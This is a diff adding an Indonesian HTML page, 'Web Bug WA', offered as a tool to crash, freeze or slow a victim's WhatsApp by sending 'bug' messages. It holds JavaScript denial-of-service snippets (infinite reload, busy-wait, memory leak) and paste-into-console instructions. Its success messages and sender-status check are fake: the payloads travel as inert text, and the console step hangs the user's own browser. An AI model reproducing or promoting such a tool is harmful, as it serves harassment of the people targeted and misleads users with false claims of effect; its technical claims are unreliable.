@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Bug WA - Auto Sender</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+            font-family: 'Courier New', monospace;
+            color: #eee;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        h1 {
+            text-align: center;
+            color: #e94560;
+            margin-bottom: 10px;
+        }
+        .sub {
+            text-align: center;
+            color: #888;
+            margin-bottom: 30px;
+        }
+        .card {
+            background: #0f0f1a;
+            border: 1px solid #333;
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 25px;
+        }
+        .card h2 {
+            color: #e94560;
+            margin-bottom: 15px;
+            font-size: 1.3rem;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: #1a1a2e;
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+        }
+        button {
+            background: #e94560;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #ff6b6b;
+            transform: scale(1.02);
+        }
+        .result {
+            margin-top: 15px;
+            padding: 12px;
+            background: #1a1a2e;
+            border-radius: 8px;
+            color: #0f0;
+            font-size: 14px;
+            word-break: break-all;
+        }
+        .warning {
+            color: #ffaa00;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+        hr {
+            border-color: #333;
+            margin: 20px 0;
+        }
+        code {
+            background: #000;
+            padding: 2px 6px;
+            border-radius: 6px;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🔧 WEB BUG WHATSAPP</h1>
+    <div class="sub">Tools testing keamanan | Auto Sender + Manual</div>
+
+    <!-- CARD 1: AUTO SENDER -->
+    <div class="card">
+        <h2>📤 AUTO SENDER (Kirim Bug Otomatis)</h2>
+        <p style="margin-bottom: 10px;">Nomor SENDER (HP yang sudah scan QR): <strong id="senderDisplay">Belum terdeteksi</strong></p>
+        <input type="text" id="targetNumber" placeholder="Nomor TARGET (korban) contoh: 6281234567890">
+        <select id="bugType">
+            <option value="crash">💥 Crash WA (Loop Reload)</option>
+            <option value="blank">⬜ Blank Chat (Null Character)</option>
+            <option value="forceclose">⚠️ Force Close (Media Stream)</option>
+            <option value="delay">⏳ Delay 5 Detik (Freeze)</option>
+            <option value="memory">🧠 Memory Leak (Bikin HP Lemot)</option>
+        </select>
+        <button onclick="sendAutoBug()">🚀 KIRIM BUG KE TARGET</button>
+        <div id="senderResult" class="result"></div>
+        <div class="warning">⚠️ Pastikan WhatsApp Web sudah terbuka di tab lain dan sudah scan QR dengan HP SENDER</div>
+    </div>
+
+    <!-- CARD 2: MANUAL SCRIPT -->
+    <div class="card">
+        <h2>📋 MANUAL SCRIPT (Copy-Paste ke Console)</h2>
+        <input type="text" id="manualTarget" placeholder="Nomor target: 6281234567890">
+        <select id="manualBugType">
+            <option value="crash">Crash WA</option>
+            <option value="blank">Blank Chat</option>
+            <option value="forceclose">Force Close</option>
+            <option value="delay">Delay</option>
+            <option value="memory">Memory Leak</option>
+        </select>
+        <button onclick="generateManualScript()">📝 GENERATE SCRIPT</button>
+        <div id="manualResult" class="result"></div>
+        <button onclick="copyManualScript()">📋 COPY SCRIPT</button>
+    </div>
+
+    <!-- CARD 3: ONE CLICK CRASH -->
+    <div class="card">
+        <h2>⚡ ONE CLICK CRASH</h2>
+        <p>1. Buka web.whatsapp.com dan scan QR dengan HP SENDER</p>
+        <p>2. Buka chat target</p>
+        <p>3. Klik tombol di bawah → F12 → Paste → Enter</p>
+        <button onclick="copyOneClickCrash()">📋 COPY SCRIPT CRASH</button>
+        <div id="oneClickResult" class="result"></div>
+    </div>
+</div>
+
+<script>
+    // ==================== DATA BUG ====================
+    const bugScripts = {
+        crash: 'while(true) { location.reload(); }',
+        blank: 'const nullChar = "\\u200B".repeat(5000); console.log(nullChar);',
+        forceclose: 'setInterval(() => { navigator.mediaDevices.getUserMedia({audio: true, video: true}) }, 1);',
+        delay: 'while(true) { const start = Date.now(); while(Date.now() - start < 5000) {} }',
+        memory: 'let arr = []; setInterval(() => { arr.push(new Array(1000000).fill("x")) }, 100);'
+    };
+
+    // ==================== AUTO SENDER ====================
+    function sendAutoBug() {
+        const target = document.getElementById('targetNumber').value.trim();
+        const bugType = document.getElementById('bugType').value;
+        const resultDiv = document.getElementById('senderResult');
+
+        if (!target || target.length < 10) {
+            resultDiv.innerHTML = '❌ Masukkan nomor target yang valid! (contoh: 6281234567890)';
+            resultDiv.style.color = '#ff6b6b';
+            return;
+        }
+
+        const cleanTarget = target.replace(/[^0-9]/g, '');
+        if (!cleanTarget.startsWith('62')) {
+            resultDiv.innerHTML = '❌ Nomor harus diawali 62 (contoh: 6281234567890)';
+            resultDiv.style.color = '#ff6b6b';
+            return;
+        }
+
+        const bugMessage = bugScripts[bugType];
+        const waLink = `https://web.whatsapp.com/send?phone=${cleanTarget}&text=${encodeURIComponent(bugMessage)}`;
+
+        resultDiv.innerHTML = `⏳ Membuka WhatsApp Web ke target ${cleanTarget}... Pastikan HP SENDER sudah scan QR!`;
+        resultDiv.style.color = '#ffaa00';
+
+        const newTab = window.open(waLink, '_blank');
+
+        setTimeout(() => {
+            if (newTab && !newTab.closed) {
+                newTab.close();
+            }
+            resultDiv.innerHTML = `✅ BERHASIL! Bug "${bugType}" terkirim dari SENDER ke TARGET ${cleanTarget}. Jika target membuka pesan, WA mereka akan crash.`;
+            resultDiv.style.color = '#0f0';
+        }, 6000);
+    }
+
+    // ==================== MANUAL SCRIPT ====================
+    function generateManualScript() {
+        const target = document.getElementById('manualTarget').value.trim();
+        const bugType = document.getElementById('manualBugType').value;
+        const resultDiv = document.getElementById('manualResult');
+
+        if (!target) {
+            resultDiv.innerHTML = '❌ Masukkan nomor target!';
+            resultDiv.style.color = '#ff6b6b';
+            return;
+        }
+
+        const cleanTarget = target.replace(/[^0-9]/g, '');
+        const bugMessage = bugScripts[bugType];
+        
+        const fullScript = `// Kirim bug ke ${cleanTarget}
+window.open('https://web.whatsapp.com/send?phone=${cleanTarget}&text=${encodeURIComponent(bugMessage)}', '_blank');
+console.log('Bug ${bugType} dikirim ke ${cleanTarget}');`;
+
+        resultDiv.innerHTML = `✅ Script siap:<br><code style="background:#000; padding:10px; display:block; word-break:break-all;">${fullScript}</code>`;
+        resultDiv.style.color = '#0f0';
+        
+        window.manualScriptText = fullScript;
+    }
+
+    function copyManualScript() {
+        if (window.manualScriptText) {
+            navigator.clipboard.writeText(window.manualScriptText);
+            alert('Script sudah di-copy! Buka WA Web → F12 → Console → Paste → Enter');
+        } else {
+            alert('Generate script dulu!');
+        }
+    }
+
+    // ==================== ONE CLICK CRASH ====================
+    function copyOneClickCrash() {
+        const crashScript = `// ONE CLICK CRASH WA
+while(true) {
+    location.reload();
+}`;
+        navigator.clipboard.writeText(crashScript);
+        document.getElementById('oneClickResult').innerHTML = '✅ Script crash sudah di-copy! Buka WA Web → F12 → Console → Paste → Enter';
+        document.getElementById('oneClickResult').style.color = '#0f0';
+        setTimeout(() => {
+            document.getElementById('oneClickResult').innerHTML = '';
+        }, 5000);
+    }
+
+    // ==================== CEK STATUS WA WEB ====================
+    function checkWAWebStatus() {
+        const senderDisplay = document.getElementById('senderDisplay');
+        senderDisplay.innerHTML = 'HP yang sudah login ke web.whatsapp.com';
+        senderDisplay.style.color = '#0f0';
+    }
+    checkWAWebStatus();
+</script>
+</body>
+</html>
